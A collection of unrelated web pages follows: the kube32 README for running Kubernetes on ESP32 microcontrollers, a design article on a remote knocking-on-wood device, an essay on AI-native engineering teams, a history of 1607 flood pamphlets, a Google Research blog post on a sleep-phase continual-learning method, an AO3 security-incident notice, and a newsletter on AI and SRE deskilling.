title: GitHub - arterialist/kube32: Kubernetes-compatible control plane, Kubelet agent, and WebAssembly runtime for ESP32 microcontrollers · GitHub
content:
kube32
kube32 is a Kubernetes-compatible control plane and WebAssembly pod runtime for ESP32-S3 microcontrollers.
kubectl and k9s manage a cluster of boards over Wi-Fi or USB serial. Pods are WebAssembly modules executed by the wasm3 interpreter. One firmware image runs on every board. A board with PSRAM acts as the control plane and runs a local kubelet, while boards without PSRAM join as workers. The same sources build kube32-sim, a host simulator for macOS and Linux.
Features
Kubernetes API serving Pod, Node, Namespace, Service, Endpoints, EndpointSlice, Ingress, Deployment, DaemonSet, Job, ConfigMap, Secret, Lease, Event, and metrics for kubectl and k9s, including watch streams, Table output, OpenAPI v3 validation, and log tailing.
WebAssembly pods in wasm3 with SDKs and templates for Rust, C, and AssemblyScript, using either a request-handler ABI with k32_handle or an entry-point ABI with app_main, plus configurable memory limits and per-call gas budgets.
Service routing, HTTP Ingress with host and prefix rules, Server-Sent Events streams, embedded static asset bundles via k32_resp_asset and StaticBundle, and synchronous pod-to-pod HTTP calls via k32_http_call.
Persistent object store backed by a CRC-checked journal on a raw flash partition or the microSD card, plus persistentVolumeClaim pod volumes via k32_fs_* and rotated container logs for kubectl logs --previous.
Peripheral access gated per pod by a capability firewall covering GPIO pins, ADC channels, I2C and UART buses, ST7789 display, key matrix, I2S speaker, and microSD storage.
Container lifecycle management with restartPolicy set to Always, OnFailure, or Never, exponential CrashLoopBackOff, and distinct exit codes for Wasm traps, gas exhaustion, and OOMKilled.
Optional bearer-token authentication and automatic self-signed ECDSA P-256 TLS on port 6443.
Firmware rollouts through the cluster: one node at a time, SHA-256 checked, with bootloader rollback when an image does not come up healthy.
Pub/sub events via k32_event_emit and kube32.io/event-topics, bridged across nodes over ESP-NOW and UDP port 7400.
Multi-node host simulator kube32-sim and kube32-cli for building, checking, and deploying pods over the network or to node storage.
Hardware
Role Requirements Reference board
Control plane ESP32-S3, 8 MB flash, 2 MB or more quad SPI PSRAM Generic ESP32-S3 devkit with 2 MB PSRAM
Worker Any ESP32-S3 with 8 MB flash M5Stack Cardputer with ST7789 display, keypad, speaker, and microSD
See docs/hardware-spec.md for pin assignments and memory budgets.
Quick start
Simulator
Build and start a two-node cluster on macOS or Linux:
cmake -S . -B build && cmake --build build -j8
./build/kube32-sim --ingress-port 8080 --pod-port 17000
In a second terminal, configure kubectl and deploy the echo example:
export KUBECONFIG=$PWD/build/kubeconfig
kubectl config set-cluster kube32-sim --server=http://127.0.0.1:6443
kubectl config set-context kube32-sim --cluster=kube32-sim
kubectl config use-context kube32-sim
kubectl get nodes
kubectl apply -f examples/echo.yaml
Boards
Build and flash the firmware to each board with PlatformIO:
pio run -e esp32s3
bash scripts/flash.sh <serial-port> 921600
Open the serial console at 115200 baud and provision Wi-Fi and the board profile:
K32_CMD:BOARD:cardputer          # Cardputer worker only
K32_CMD:WIFI:<ssid>:<password>   # both boards
K32_CMD:AP:off                   # control plane
K32_CMD:API:<control-plane-ip>   # worker
Point kubectl at the control plane IP and apply a manifest:
kubectl config set-cluster kube32 --server=http://<control-plane-ip>:6443
kubectl config set-context kube32 --cluster=kube32
kubectl config use-context kube32
kubectl get nodes
kubectl apply -f examples/echo.yaml
See docs/quickstart.md for full setup instructions and TLS configuration.
Example: Tessera
Tessera is an issue tracker made of four WebAssembly pods routed by an Ingress. tessera-web and tessera-api run on the control plane to serve the web UI and in-memory search index. tessera-db and tessera-hud run on the Cardputer worker to persist records to an append-only log on the microSD card and drive the LCD and keypad (tessera-hud is silent by default; sound is opt-in via HUD_SOUND=1 and the speaker capability).
Generate the sample dataset, upload it to the worker's microSD card, and deploy:
make -C apps/tessera dataset
tools/kube32-cli push apps/tessera/build/card/kube32/volumes/tessera-db --node <worker-node> --path volumes/tessera-db
kubectl apply -f examples/tessera.yaml
Open http://<control-plane-ip>/ or http://127.0.0.1:8080/ on the simulator, and sign in as mara with password demo.
Documentation
Full documentation is published at https://arterialist.github.io/kube32/.
Quick start
Hardware specification
Flashing and the serial console
Writing app pods
Cluster access and authentication
Services, Ingress and pod-to-pod calls
Storage and volumes
Peripherals
Example: Tessera
Architecture overview
Kubernetes API coverage
CLI and tools reference
Contributing
Contributions are welcome. Read CONTRIBUTING.md for build instructions, test suites, and coding guidelines, or open an issue on GitHub.
Security
See SECURITY.md for the deployment security model and instructions on reporting vulnerabilities privately.
License
Apache License 2.0. See LICENSE. third_party/wasm3 is licensed under the MIT License in third_party/wasm3/LICENSE.

October 11, 2026

PREFER DESIGNBOOM ON GOOGLE

WEB APP TURNS SUPERSTITION INTO REMOTE-CONTROLLED DEVICE
 Knock On Wood is an internet-connected device that performs the familiar gesture of knocking on wood, allowing users to follow the superstition remotely when no wood is nearby. Through a web app, users press a digital button to trigger a physical device that knocks on wood in real time.
 The project is part of an ongoing series, Machines Responding to Superstitions, by designers Shashwath Santosh and Nithin Eluvathingal. Drawing on industrial design, engineering, manufacturing, critical thought, and world-building, the series uses machines to examine everyday beliefs and rituals.
Knocker strapped to a tree, about to knock on wood | all images ©Shashwath Santosh and Nithin Eluvathingal
  NETWORK OF MACHINES MAKES REMOTE KNOCKING ON WOOD POSSIBLE
 Each knocker connects to the internet and communicates with a central server, allowing multiple devices to respond to users around the world. Someone in a Tokyo café, for example, can trigger a knocker in New York’s Central Park using only a web browser, while the device requires a Wi-Fi connection. For the woodland setup shown in the project visuals, the designers Shashwath Santosh and Nithin Eluvathingal used a portable Wi-Fi hotspot to connect the machines.

title: Sashank Gondala on X: "Building an AI-native engineering org" / X
content:
Sashank Gondala
@sgondala2
Building an AI-native engineering org
5 min read
Last week Will Larson (@Lethain) asked how leaders are evaluating engineering managers for AI skills. My reply, a list of questions to think about, got a lot of bookmarks.
More broadly, I've been thinking about how to build an AI-native engineering org for a while. Sharing some lessons from the last nine months of building at FurtherAI.
Part 1: What changed in how we ship
How much we ship per engineer
Since January, the number of code changes each engineer merges a day has grown about 5x, while our revert rate has stayed under half a percent.
But giving engineers coding agents didn't get us there on its own.
Every time we sped up one step, work piled up at the next.
So we started going through the entire process of shipping software, one step at a time, and figuring out what we could optimize.
Rebuilding the shipping process
Code (March) – Agents write the code and engineers steer them. We don’t have a clean number for where this started, as early on the tools only left a mark on a change once in a while. But it’s safe to say it’s now almost 100%.
Tests (April) – Agents write tests alongside code. 91% of changes now include tests, up from 15%.
Review (May) – AI reviews 99% of changes before a person does, up from 60%. Human reviewers can focus on the parts that need judgment.
CI (June) – We parallelized tests and run only those affected by a change. CI now runs 20× the tests in the same 17 minutes.
Bug reports (July) – We've started using ClaudeTag (@claudeai) to automate our bug intake process. Anyone can report a bug in Slack, and ClaudeTag figures out duplicates, files a ticket, and assigns it to the right person. It now files 60% of bug tickets.
Rules (August) – When a bug or a review comment exposed a rule only engineers knew, we turned it into a small Python check that runs on every commit and every PR, fails the build and prints the fix. This way, we convert tribal knowledge into rules. Agents hit these checks, fix their own code and move on. We went from zero to 21 rules. They're a big part of why low-risk changes can now merge without a person.
Merging (August) – Low-risk changes that pass tests, automated checks, and AI review merge on their own. Up to a third of our changes now merge without a person involved.
Code channels (September) – Anyone can open a Slack channel, describe a change to an agent, and have it open a PR. We don't have a clean number for this yet, but it's been great for collaboration: several people can work with the same agent in one channel, adding context and steering it as it goes. We also heavily use Devin's (@cognition) cloud sessions to collaborate as a team.
We also use our in-house Poirot and Sherlock agents to investigate and resolve issues across production and staging. They have all the tools and context they need across logs, metrics, trace and read-only database access
Some of the best moments are when agents work together. Claude Tag triages a request, Devin does the work, and Poirot pulls the internal data it needs. It's fun to watch them talk to each other and pass information along.
One interesting side effect is that non-engineers have started shipping code too. Our designer has merged about 50 changes since August, including the ones that built our design system. People in deployment and customer-facing roles can also make UI tweaks themselves right from slack
What it cost us
None of this was free. Through the summer, much of our engineering effort went into tests and tooling, and customer-facing changes per engineer stayed between 17 and 30 a month.
In September, that jumped to 45. October is on pace for 48.
Part 2: What's changing in the team
As engineering got faster, we started noticing a different problem.
The new bottleneck
We got much faster at writing code, but not nearly as fast at deciding what to build.
Here's a simplified example.
Say a feature used to take ten days: three to plan, six to build, and one to review.
If agents make building 3.5× faster, but planning and review stay the same, the overall feature only gets 1.75× faster.
Planning and review now account for 70% of the time, up from 40%.
Traditionally, a lot of these decisions flow through engineering managers, PMs, and designers. That becomes increasingly difficult as engineers get faster.
How do you organize a team where engineers can build much faster, without creating bottlenecks around decisions and reviews?
Our bet is to push more ownership to engineers. Rather than adding more layers of management, we want engineers to handle more of the planning, execution, and review themselves.
That changes what we expect from engineers and managers.
What it means for engineers
I'm starting to think of engineering seniority in terms of how much of a problem someone can own end to end. Roughly:
Junior engineer – Builds with an agent and can tell when it's wrong.
Senior engineer – Plans and reviews their own work.
Staff engineer – Takes a vague problem, makes the tradeoffs, and owns the number that says whether it worked.
It also means engineers need to be closer to customers.
We're empowering engineers to own more of the process end-end, from understanding the customer problem to shipping a solution to verifying success and owning regressions in production.
What it means for managers
This also changes what we expect from engineering managers.
1. Be in the work.
Managers need to understand what's being built, why, and whether it's the right solution.
I want managers trying features on staging as an end user would, not just checking that the code was reviewed. You catch a different class of problems when you actually use the product.
But the goal isn't just to review more. As always, it's to develop engineers who can make the right decisions themselves, so managers only step in on the ones that need their judgment.
2. Be more product-savvy.
When writing code becomes cheaper, deciding what to build matters a lot more.
I want engineering managers who understand customers, have strong product opinions, and are comfortable making product decisions, not just technical ones.
They should also help engineers develop that judgment. We shouldn't need a PM or designer to make every small product decision.
Where this leaves us
We spent most of this year figuring out how to make engineers faster. Now we're trying to figure out how to make the entire organization move at that speed.
I suspect this will be a harder problem than automating code, tests, and reviews.
We're still early, and there's a lot we haven't figured out. But it's one of the most interesting engineering challenges I've worked on.
I'm curious what other teams are seeing. What broke first as your engineers started shipping faster?
We're hiring Engineering Manager / Director at @furtheraicom to solve the next wave of challenges. If this sounds interesting, reach out!

Wonderful Weather
Floods and Foreboding in 17th-Century Britain
By Erik Crnkovich
When the Bristol Channel flooded in 1607, it was not just one of the worst natural disasters in British history, it was also a sign, for many, that they had strayed from the path of God. Erik Crnkovich examines the overlap of miraculous weather and the early modern printing industry, which cultivated a thirst for all things occult, exotic, and odd.
PUBLISHED
October 28, 2026
Title-page woodcut from 1607, A True Report of Certaine Wonderfull Ouerflowings of Waters, Now Lately in Summerset-shire, Norfolke, and Other Places of England (1607) — Source.
When the Bristol Channel flooded on January 30, 1607, pamphlets describing it as God’s warning to a wayward people likewise flooded out of London’s booming presses. Rare weather events of all sorts are ironically commonplace in seventeenth-century news — a century otherwise tempestuous in its frequent, often literal, chopping and changing in church and state. In fact, the two are reflections of each other. True, British weather was consistently inconsistent during the Little Ice Age, a period of prolonged cold and wet that would not end for another two centuries. But the headlines reporting “prodigious” thunderstorms, “miraculous” apparitions, and “terrible” earthquakes were often followed by interpretations of them as moral weathervanes — divine providence, a sign to repent and return to the proverbial straight and narrow.
It is perhaps little surprise, then, that the pamphleteer William Jones rushed to the presses when a storm surge inundated 518 square kilometres surrounding the Bristol Channel. Present scholarship counts 2,000 recorded deaths, making it one of Britain’s worst natural disasters and, according to Jones, a judgement from God.1
Many are the dumb warnings of Destruction, which the Almighty God hath lately scourged this our Kingdom with; And many more are the threatening Tokens, of his heavy wrath extended toward us: All which in bleeding hearts, may enforce us to put on the true garment of Repentance.2
Like many disaster narratives, Jones starts his account with the truism that the morning of the flood was just like any other: the skies were clear and sunny, ploughmen cut their furrows, shepherds led their flocks to pasture, farmers set about their morning rounds in the yards when, suddenly, “mighty Hills of water” appeared on the horizon, “tumbling one over another”.3 The waters swept away buildings and bridges, inundated granaries and warehouses, and flooded the streets of Bristol; across the countryside, the carcasses of wild animals, drowned cattle, sheep, chickens, and (oddly) ducks dotted the flood waters. Some people managed to flee, some drowned; others sought refuge in trees and church steeples where they endured hunger and cold for days before rescue.
Title-page woodcut from Gods Warning to His People of England (1607) — Source.
A Protestant, Jones lays some of the blame on the “late Papistical Conspiracy of Traitors”, but the sinfulness is generally all-encompassing.4 This is less than surprising. The weight of morality in England was more immediate after the Reformation: clerical and saintly intermediaries between Creator and creation had been removed, innate sinfulness emphasised, and God positioned as a strict schoolmaster meting out punishment and reward. While prodigious events were acknowledged as natural, therefore, they were still thought of as induced by human immorality. Pamphleteers routinely draw on cardinal transgressions, such as adultery and blasphemy, but also charge specific places with specific penchants (Cork, usury; Tiverton, miserliness; Banbury, breaking the Sabbath). This waywardness required God to intervene, to exercise “special” providence to steer humankind along the path of “general” providence, the predetermined course set in stone at creation. Natural phenomena were often interpreted as signs of divine intervention in seventeenth-century print, particularly when preternatural in effect and prodigious in scale.5
Jones emphasises the flood’s apocalyptically topsy-turvy nature: the land is turned to water, the rich are made poor, the fertile is laden with salt, and scholars are left dumbfounded. Yet the “merciless” waters also provide a stage for miraculous, divine acts of mercy. In Monmouthshire, a milkmaid stranded on a high bank is eventually saved, “through God’s good help”, when some large troughs are lashed together and two muscly men punt to the rescue.6 Moreover, Jones asks us to “mark what befell, at this time, of the strangeness of other creatures”: because, as the tide rose around the bank, the milkmaid found her haven “also covered over, with wild beasts” — dogs, cats, foxes, and rodents — “that thither to seek for succour” and yet, predator and prey mingled, “in this danger of life, they not once offered to express their natural envy: But in a gentle sort, they freely enjoyed the liberty of life.”7
In a different account of the flood, A True Report of Certain Wonderful Overflowings of Water (1607), an anonymous author illustrates the miraculous with “tragi-comical” stories that are more eyebrow-raising than hair-raising. The author reports, for instance, that a man planning to travel to a local town to “be merry” had his horse saddled and at the ready when “the wind came about, the point of his compass was changed, his voyage by land was to be made by water, or else not at all.” Instead of fleeing on horseback (as some do in Jones’ account), the man abandons his stead and retreats up his roof, sitting “astride” its ridge. The anonymous author then gleefully describes how the roof is lifted off the house by the flood and begins to float — so “Neptune” could see “how well he could ride” — eventually, lo and behold, taking him to “the very town, where in the morning he meant to take up his inn.”8
Title-page from A True Report of Certain Wonderful Overflowings (1607) — Source.
Title-page from Lamentable Newes Out of Monmouthshire (1607) — Source.
It is difficult to know how much credence a contemporary reader placed in these reports. But that there was wariness of spurious news is evidenced, if anything, by the lengths to which their writers went to assert their credibility. Some are, granted, no more than lip service: the author of the “tragi-comical” accounts above simply says they include “none but those that are true”.9 While a third account of the Bristol flood, entitled Lamentable Newes Out of Monmouthshire (1607), makes a more concerted effort, the author saying they initially refused to write on the disaster because “of the usual unfaithfulness of men ordinarily in reporting of such accidents”.10 More strident authors list the names and addresses of eyewitnesses. To prove his account of a miraculous rain shower of wheat, the author William Averell lists, among others, a clothier “Master William Geffreyes dwelling in Ipswich” and “John Bull, servant to Justice Germaye”.11 A True Relation of the Wonderful Apparition of a Cross in the Moon name-drops none other than the Lord Chancellor of Ireland.12 Generally, the higher up the social ladder a witness was, the more credible they were thought to be.
The pamphlets were immensely popular, questions about their veracity notwithstanding. Overall, the sixteenth and seventeenth centuries witnessed an “early modern vogue for the preternatural”, to quote historian of science Lorraine Daston, a passion for anything whiffing of oddities, the occult, witchcraft, or exotic news from beyond the horizon.13 The skies above Britain were no different. This fascination was partly academic: unusual natural phenomena of all sorts stood out in the prevailing scientific paradigm of Francis Bacon as providing a better window into the natural world than simply observing its smooth, quotidian ticking over. But there was also a millenarian culture of moral crisis — tensions between Catholics and Protestants, Roundheads and Cavaliers, Puritans and everyone — that left the public searching for omens. The apogee of the pamphlet and broadside, “true” and “certain” reports of marvels, wonders, and prodigies of all sorts flooded the market, sold from shops around St Paul’s Cathedral, London, huckstered outside of theatres and alehouses, or carried by peddlers into the countryside.14
Print seller depicted in Marcellus Laroon’s Cryes of the City of London Drawne after the Life (1688) — Source.
Print seller depicted in Marcellus Laroon’s Cryes of the City of London Drawne after the Life (1688) — Source.
Not all prodigies, however, were immediately accepted as true signs from on high.15 Jones argues for the providential nature of the flood in Gods Warning by underscoring its preternatural quality — how animals that would usually fight like cats and dogs did not “express their natural envy”. But other pamphleteers employ historical analogy or theological argumentation to assert that the lightning, hail, or winds they report are more than just bad weather. The author of A True Report, for example, pairs his description with an account of a flood that happened in 1570, “that comparing the one with the other, God’s justice and mercy may both be seen”.16 A similar approach is taken by Averell in his report of the rain shower of wheat, prefacing a laundry list of sundry omens, ranging from “the noise and sound of trumpets from the skies” to “showers of blood.”17 In Lamentable Newes, readers eager to learn about the “great many” who were “utterly undone” advertised on the title page may have been disappointed to first wade through eleven pages of theological exegesis on God’s power, tracking from Adam and Eve through to Noah and the flood.
Woodcut compilation of prodigies reported in 1680, ranging from inclement weather to celestial phenomena, from Christopher Ness’ The Signs of the Times (1681) — Source.
Separating the showers of wheat from the showers of chaff had real importance at a time when there was widespread acceptance of omens as a true sign of divine judgement. The church and state, as those primarily responsible for upholding a moral society, faced roundabout critique in claims that God was signalling displeasure. A typical response to poor weather, throughout the period, was to order penitent self-humiliation, prayer, and fasting in church and at home as a plea for divine mercy.18 But the politics of weather could be particularly pointed when they correlated with specific events, as when a violent thunderstorm shook London immediately after the coronation of Charles II. Breaking an extended period of consistently pleasant weather, the storm’s timing was striking enough for the diarist Samuel Pepys, otherwise a sceptic of omens, to admit that it was “strange”. In a case of seventeenth-century spin, Charles’ supporters tried to frame the storm as celebratory.19 Prodigious storms seem to have been more likely to confirm existing biases than lead to groundswells in public sentiment or piety.
As it stands, Jones’ account is comparatively light on theological argumentation or political point-scoring; his is an argument for moral reform that relies more on rhetoric, drama, and, unsurprisingly, fearmongering. In concluding his account, he turns to a description of the area around Barnstaple, Devon, and heightens the drama by bringing the reader into the present tense:
There is little now remaining there, to be seen, but huge Waters like to the main Ocean: The tops of Churches and Steeples like to the tops of Rocks in the Sea, Great Reeks of fodder for cattle, are floating like Ships upon the Waters, and dead Beasts swimming thereon.
This “merciless Water breaking into the bosom of the firm Land”, he continues, “hath proved a fearful punishment” to all creatures great and small. A punishment so great, Jones writes, that it could have easily been mistaken for end times had God not promised Noah to never destroy the Earth again with water, conveying this promise with the sign of the rainbow.20

Reading the Skies: A Cultural History of English Weather, 1650–1820
By Vladimir Janković
From the time of Aristotle until the late eighteenth century, meteorology meant the study of “meteors” — spectacular objects in the skies beneath the moon, which included everything from shooting stars to hailstorms. In Reading the Skies, Vladimir Jankovic traces the history of this meteorological tradition in Enlightenment Britain, examining its scientific and cultural significance.
More Info and Buy
Providence in Early Modern England
By Alexandra Walsham
This book is the most extensive study to date of the sixteenth- and seventeenth-century belief that God actively intervened in human affairs to punish, reward, and chastise. Providentialism has often been seen as a distinctive hallmark of puritan piety. However, Dr. Walsham argues that it was a cluster of assumptions that penetrated every sector of English society, cutting across the boundaries created by status, creed, education, and wealth.

title: The sleep framework: A new way for LLMs to retain knowledge in continual learning
content:
Home Blog
The sleep framework: A new way for LLMs to retain knowledge in continual learning
October 27, 2026
Ali Behrouz and Vahab Mirrokni, Google Research
We introduce a sleep phase in continual learning, enabling large language models to continuously integrate new facts and enhance reasoning while mitigating catastrophic forgetting or static knowledge cutoffs.
Modern LLMs achieve impressive performance via pre-training and in-context learning (ICL). However, once deployed, they remain largely static, operating with a fixed knowledge cutoff date that leaves them unable to acquire long-term capabilities or adapt to new information.
While updating models with new data seems like the obvious solution, continual parameter updates often trigger catastrophic forgetting, a fundamental issue where learning new tasks severely degrades performance on previously learned ones. Alternatively, relying strictly on ICL limits knowledge retention to the immediate context window: once the context session ends, the acquired short-term information is forgotten.
Inspired by how the human brain processes and stabilizes memory during rest, we introduce a sleep framework in continual learning: a learning paradigm that equips large language models (LLMs) with a continuous periodic lifecycle, enabling them to continually learn, consolidate fragile short-term context into stable long-term parameters. With this framework, we demonstrate that alternating between active interaction and offline memory consolidation allows LLMs to continuously acquire new facts, retain long-context knowledge up to 10M tokens, and improve complex reasoning.
Rethinking machine learning: Active (wake) vs. sleep phases
Traditional machine learning relies on a strict separation between training and inference. In a continual learning framework, this distinction becomes artificial; an intelligent agent must constantly learn, adapt, and process information.
Under the sleep paradigm, an LLM operates across two primary states:
Active (wake) phase: The model actively receives, processes, and interacts with inputs, storing temporary information in fast, short-term memory components.
Sleep phase: The model pauses processing new inputs and redirects its internal computations toward memory consolidation and self-improvement.
While terms like "sleep," "dreaming," and "self-improvement" borrow from neuroscience, our framework operates entirely within a fixed model architecture and human-defined training rules. During the offline sleep phase, the model unlocks pre-allocated Mixture-of-Experts (MoE) memory blocks and updates its numerical weights using self-generated practice examples. This automated post-training cycle helps a deployed model absorb new facts and sharpen its reasoning accuracy while keeping its core codebase and design unchanged.
Key components of the sleep process
The sleep paradigm addresses catastrophic forgetting and continuous adaptation through two stages: memory consolidation and dreaming.
1. Memory consolidation
In the human brain, non-rapid eye movement (NREM) slow-wave sleep consolidates fragile memories into long-term structures via abstraction and distillation. Our proposed sleep framework mirrors this natural phenomenon through two key technical mechanisms:
Parameter expansion & continuum memory hierarchy: To prevent catastrophic forgetting, the model dynamically scales its capacity during sleep. Using a Mixture of Experts (MoE) and Hope architecture , newly unlocked, low-rank experts are integrated into stable, lower-frequency memory blocks to store incoming knowledge without disrupting older parameters.
Knowledge seeding (upward distillation): Fragile short-term memories stored in high-frequency layers (e.g., in-context memory) are transferred into the newly expanded long-term parameters. This is achieved through Generalized Knowledge Distillation (GKD) combined with reinforcement learning (RL)-based imitation learning:
On-policy distillation: The expanded student model learns token-specific feedback from teacher distributions generated on self-sampled sequences.
Learning to imitate (LTI): The student model is rewarded based on semantic and absolute similarity (Levenshtein distance) when completing prefixes of teacher-generated text.
Synaptic pruning: Once the memory consolidation into lower-frequency modules is complete, the high-frequency temporary parameters are reset, freeing up capacity for future active sessions.
Overview of our sleep framework: Input streams from the active phase are stored in short-term memory before entering the sleep cycle, which bifurcates into Consolidation (transferring fragile short-term tokens into expanded long-term parametric memory using low-rank structures and MoE) and Dreaming (autonomous self-improvement via synthetic routing with random experts and RL refinement).
2. Dreaming for self-improvement
During REM sleep, the human brain actively simulates scenarios, consolidates emotional/semantic connections, and explores novel neural pathways. Mirroring this, during the “dreaming stage”, the sleep framework implements an autonomous self-improvement loop:
Random expert selection: During synthetic data generation, the MoE router randomly activates non-standard experts. This forces the model to mix disparate domains of knowledge and uncover latent patterns.
Curated rehearsal: The model generates synthetic training samples ("dreams") and filters them using gradient-based data selection to prioritize samples with the highest potential to boost overall model capability.
RL refinement: The model performs supervised fine-tuning on top-rated dream samples and evaluates whether the generation improves performance on downstream tasks.
Theoretical foundations
Beyond the empirical results, our sleep paradigm is grounded in a theory that clarifies why its two stages (memory consolidation and dreaming) can support continual learning without simply trading new knowledge for old capabilities.
For memory consolidation, the analysis shows that knowledge seeding can be understood as a structured, low-rank compression problem. The model is not asked to copy every detail of its short-term traces into its parameters. Instead, it identifies a compact set of directions that best preserve both the model’s own on-policy behavior and the semantic qualities rewarded by the learning objective.
This perspective explains the complementary roles of the two signals: on-policy distillation aligns consolidation with the trajectories the model will actually produce at inference time, reducing the mismatch that can arise when training only on teacher-generated distributions; meanwhile, the semantic reward changes what is worth retaining, prioritizing directions that preserve meaning and task-relevant behavior rather than merely matching token probabilities. Parameter expansion then provides the capacity needed to write these selected memories without overwriting previously consolidated knowledge.
For dreaming, the theory characterizes random expert activation and reward-based sample selection as mechanisms for improving the geometry of learning. Injecting different MoEs broadens the set of gradient directions explored during synthetic generation, exposing the model to a richer collection of updates than those induced by its ordinary wake-time data alone. Gradient-based filtering then emphasizes the synthetic experiences that carry the most useful learning signal, strengthening informative directions while preserving the structure of the underlying gradient space.
Together, these steps yield a more balanced optimization landscape: learning is less dominated by a small number of directions, gradients are better conditioned, and the model can make more stable progress when refining its capabilities. In this view, dreaming is not simply self-generated data augmentation; it is a deliberate process for diversifying, selecting, and consolidating the updates through which the model improves itself.
Comparative performance of our sleep framework against baseline approaches (such as in-context learning and supervised fine-tuning) across major evaluation axes, including Class-Incremental Learning, continual translation, long-context scaling up to 10M tokens, factual knowledge incorporation, and mathematical reasoning.
For continual translation, in unseen languages, such as Manchu and Kalamang, the sleep framework maintained a near-zero performance drop in multi-stage evaluations, whereas standard baselines like ICL, Cartridges, and supervised fine-tuning (SFT) suffered severe catastrophic forgetting during sequential learning.
In long-context understanding on the BABILong benchmark, our sleep method demonstrated near-perfect scaling up to 10M tokens, outperforming strong baselines like GPT-4, and Titans by using sleep-time consolidation to compress long-context information directly into parametric memory.
For factual knowledge incorporation evaluated on SQuAD and continued pre-training (CPT), our sleep method achieved 48.9% on single-task and 46.2% on CPT evaluations, outperforming baseline methods including the base model, SFT, and Self-Adapting Language Models (SEAL) by successfully integrating new factual information without degrading existing model representations.
Finally, on mathematical reasoning benchmarks including AIME 24/25 and HMMT 25, sleep-enhanced base-model achieved accuracy scores of 79.2%, 69.0%, and 46.1%, respectively. This outperformed baselines like SFT, group relative policy optimization (GRPO), and on-policy self-distillation (OPSD), showing that pairing memory consolidation with imitation learning drives superior reasoning performance.
Conclusion
Our sleep paradigm provides a path toward autonomous, continually learning AI systems. By moving beyond static pre-training and fragile context windows, alternating between active learning and offline rest empowers LLMs to retain short-term memories, abstract new skills into long-term parameter structures, and continuously self-improve without catastrophic forgetting.
Acknowledgements
This research was conducted by Ali Behrouz (Google and Cornell University), Farnoosh Hashemi (Cornell University), Adel Javanmard (Google and University of Southern California), and Vahab Mirrokni. We thank Yuan Deng and Corinna Cortes for reviewing the work and their valuable suggestions. We also thank Mark Simborg, Kimberly Schwede, and Tim Herrmann for their help in crafting this blog post.

title: Organization for Transformative Works Status
content:
SUBSCRIBE TO UPDATES
AO3 Down for Maintenance
Update - Earlier today, we detected evidence of a security incident on AO3. We are still in the early stages of response to this security incident and determining its scope. AO3 will remain down while we continue investigating and addressing what has been found so far. However, we want to make some things clear:

First, no AO3 data has been deleted. All your works, bookmarks, kudos, etc., are safe.

Second, while we currently don't believe that the user database was stolen, we are also unable to rule it out. The AO3 database contains account information that may include your username, email address, IP address, and a hashed version of your password.

We use industry-standard techniques for storing passwords in a scrambled form that cannot easily be reversed. Even so, no hashing method can fully protect a weak or reused password from being cracked.  As a precaution, we recommend that you change your passwords on any other sites where you use the same password as on AO3.

AO3 does not collect real names, so none could be exposed. Additionally, our donor information is held in an entirely separate system and is never linked to AO3, so that data has also not been exposed.

We will update everyone as our investigation continues; we may be unable to respond to individual inquiries from users. Please keep an eye on our official outlets for updates. Our next update will be posted when we have further information available.

Our current expectation is that AO3 will be down for a minimum of two weeks; however, it could take up to four weeks. During that time, we may be able to bring the site back up in a degraded state, meaning that not all features will be available and/or the site may be read-only. If we are able to do that, please be aware that we might have to bring the site back down unexpectedly as part of our recovery efforts. We will keep you in the loop for any developments.

title: AI Isn't Replacing SREs. It's Deskilling Them.
content:

Stories from hard-core observability nerds at SigNoz - spreading the word on open-source, observability, OpenTelemetry and behind-the-scenes of building a dev tool infra product.

AI Isn't Replacing SREs. It's Deskilling Them.
When AI handles 95% of your incident response, do you get worse at handling the 5% that actually matters?
ELIZABETH
FEB 28, 2026
22
5
4
Share
💌 Hey there, it’s Elizabeth from SigNoz!
This newsletter is an honest attempt to talk about all things - observability, OpenTelemetry, open-source and the engineering in between!
&
This piece took 6 days, 5 hours to be cooked, hope we served. 🌚
Subscribe
There are two popular prophecies floating around tech circles these days.
The first says SRE is the future of all software engineering, that as AI writes more and more code, the humans who remain will be the ones keeping systems alive. The second says AI will devour every tech job alive, SREs included. Neither is particularly useful if you’re an SRE trying to figure out what your Tuesday will look like in 2027.
Let’s ask a more grounded question by looking at what’s already happening: When AI handles 95% of your incident response, do you get worse at handling the 5% that actually matters?
Most of us already use AI for our daily work (our brains a little fried!), and so do SREs. Today’s discussion agenda is not whether AI replaces SREs, but whether AI is quietly making SREs less capable and whether anyone will notice anything before the next novel outage hits. The foundational framework for this entire debate comes from a 1983 research paper that’s eerily prescient.
The Ironies of Automation: Part-I
Note from author: Below is a brief precursor to History of Automation, which you might enjoy if you are into History and Cultures (like me 😉).
In 1983, a cognitive psychologist named Lisanne Bainbridge published a paper called Ironies of Automation. It became one of the most cited papers in human factors research, and its core argument is almost uncomfortably relevant today.
Bainbridge studied what happened when factories and industrial systems automated the work of blue-collar operators. The findings were paradoxical and revealed that the more you automate a process, the more critical the human operator becomes during the rare moments automation fails and the less practice they get, and the worse they become at exactly those interventions. Automation, which was inherently designed to remove humans from the loop, left them with the worst possible job, i.e., long stretches of passive monitoring punctuated by rare, high-stakes crises they were increasingly unprepared for.
Ring any bells yet? 🙂
Basically, I’m drawing a parallel between the AI revolution and industrial automation. Industrial automation reshaped blue-collar work by taking over routine physical tasks, and the workers who remained had to handle exceptions they’d lost the muscle memory for. AI is doing the same thing to knowledge workers by taking over the routine cognitive tasks, the pattern matching, the triage, the known-issue resolution and leaving humans with the rare, complex, ambiguous problems.
The exact problems that require deep expertise, the exact expertise that atrophies when you stop practising.
Now we’re replaying this pattern with AI agents, and the stakes in software systems are only growing.
Current State of AI in SRE
Let’s take stock of where things stand today in the world of site reliability engineering.
What’s already automated or heavily AI-assisted?
Alert noise reduction and intelligent grouping, runbook execution for known issues, log pattern detection and anomaly flagging, and basic root-cause suggestions from historical incident data, and auto-remediation for well-understood failure modes like restarting a crashed pod or scaling up a service that’s running hot, are all fairly automated today.
What’s on the horizon?
Some immediate targets include multi-signal correlation across metrics, logs, and traces, autonomous root-cause analysis for partially understood failures, predictive incident detection before users are affected, AI-driven change risk assessment and automated rollbacks.
PagerDuty frames this as a tiered model.
Tier 1 incidents: Known issues with known fixes get fully automated.
Tier 2 incidents: Partially understood problems receive AI recommendations with human validation.
Tier 3 incidents: Novel, complex, cascading failures stay human-led, with AI providing supporting context.
But here’s the catch.
